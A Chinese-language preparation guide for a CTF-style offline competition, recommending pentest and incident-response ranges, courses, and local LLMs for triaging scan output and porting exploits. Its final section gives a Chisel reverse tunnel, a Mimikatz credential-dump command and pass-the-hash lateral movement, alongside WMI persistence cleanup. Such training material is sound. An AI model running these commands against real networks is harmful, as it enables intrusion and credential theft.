# 禹王杯线下赛：靶场、速成课与AI模型推荐 (综合实战/PVE方向)

## 一、 靶场推荐（内网渗透与综合实战 PVE）

既然是 **PVE 靶场渗透与综合实战**，比赛的核心将围绕“外网打点 -> 内网横向 -> 域控拿下”以及相应的“组网防御与应急响应”展开。推荐以下靶场：

### 1. 内网渗透靶场 (红队/打点)
* **VulnStack（红日安全靶场）**: 国内最经典的内网渗透靶场系列。特别是 1-7 关，涵盖了 Web 打点、提权、横向移动、域环境渗透等全套流程。非常适合组网渗透训练。
* **Hack The Box (Pro Labs / Tracks)**: HTB 的企业内网模拟环境极其逼真。如果是基础，可以打打 Active Directory 相关的 Tracks；如果是进阶团队，可以尝试 Offshore 等 Pro Labs。
* **GOAD (Game of Active Directory)**: 开源的专精于 AD 域渗透的靶场，能在本地 PVE 或虚拟机上一键部署，练习 Kerberoasting、血狗(BloodHound)分析的最佳场所。

### 2. 应急响应靶场 (蓝队/防御)
* **玄机靶场**: 国内顶尖的应急响应专项靶场，涵盖了勒索病毒溯源、挖矿排查等场景。
* **CyberDefenders**: 国际高质量蓝队靶场，重构真实攻击事件的取证环境。

---

## 二、 优质速成课与学习资源

* **红日安全 VulnStack 官方及 B 站 WP**: B 站搜索“红日安全靶场”，看大佬如何一步步打进内网并提权，重点学习 Chisel、FRP 代理转发和 MSF/CS 的联动。
* **HTB Academy (内网渗透路径)**: HTB 学院的 Penetration Tester (CPTS) 路径中关于 Active Directory Enumeration & Attacks 的模块，是目前业内最权威的速成指南。
* **内网神书**: 恶补《内网安全攻防：渗透测试实战指南》。

---

## 三、 本地辅助小模型推荐

在 PVE 综合实战中，局域网部署小模型的核心作用是**“信息降噪与脚本生成”**：

* **模型选择**:
    * **Qwen2.5-Instruct (7B/14B)**: 中文理解最好，能够迅速帮你分析长篇大论的 Windows 事件日志（Event Log）。
    * **DeepSeek-Coder-V2 (7B/8B)**: 代码能力强，当你找到一个古老的内网服务 CVE 时，让它帮你改写 Python2 的 EXP 到 Python3。
* **最佳辅助场景**:
    1. **Nmap 结果总结**: 把成百上千行的 Nmap 扫描结果丢给它，让它提取开放了高危端口（如 445, 135, 3389）的存活主机。
    2. **LinPEAS / WinPEAS 分析**: 提权辅助。扫描出的提权报告太长？让模型帮你找出最可能成功的提权路径。
    3. **日志溯源分析**: 在防御环节，将 `/var/log/secure` 或 IIS 日志直接喂给模型，提取攻击者的源 IP 和利用链。

---

## 四、 核心知识点实战示例

### 1. 基础示例：代理转发打通内网 (简单)
**场景**：你刚拿下了一台边缘 Web 服务器（双网卡：公网和内网 10.10.10.0/24）。
**实战**：你需要迅速把本机的流量代理进内网进行下一步扫描。利用 Chisel：
* 攻击机跑服务端：`chisel server -p 8000 --reverse`
* 靶机跑客户端：`chisel client 攻击机IP:8000 R:socks`
然后利用 proxychains 配合 nmap 扫描内网网段。

### 2. 进阶示例：域环境凭证窃取与横向移动 (复杂)
**场景**：你进入内网后，发现这是一套 Windows Active Directory 域环境。
**实战**：在拿下一台域成员主机并提权到 SYSTEM 后，你需要抓取密码哈希。
利用 Mimikatz（或通过 CS 插件）：
`sekurlsa::logonpasswords`
拿到 NTLM Hash 后，不一定要破解，直接使用 Pass-The-Hash（哈希传递攻击）配合 psexec 或 wmiexec 横向登录其他主机甚至域控。

### 3. 高阶示例：应急排查与隐藏的无文件恶意软件 (极难)
**场景**：在防御阶段，你发现服务器不断向外网发出心跳包，但 `netstat` 看不到可疑进程，且杀软无警报。
**实战**：攻击者可能使用了 WMI（Windows Management Instrumentation）来持久化无文件后门。恶意代码直接存在 WMI 存储库的注册表中，依靠事件订阅触发，完全不落地。
**应对**：必须使用专业的 Sysinternals 工具套件中的 `Autoruns` 深度排查 WMI 劫持，或者使用 PowerShell 脚本 `Get-WmiObject -Namespace root\subscription ...` 来清除恶意的 EventFilter 和 CommandLineEventConsumer。
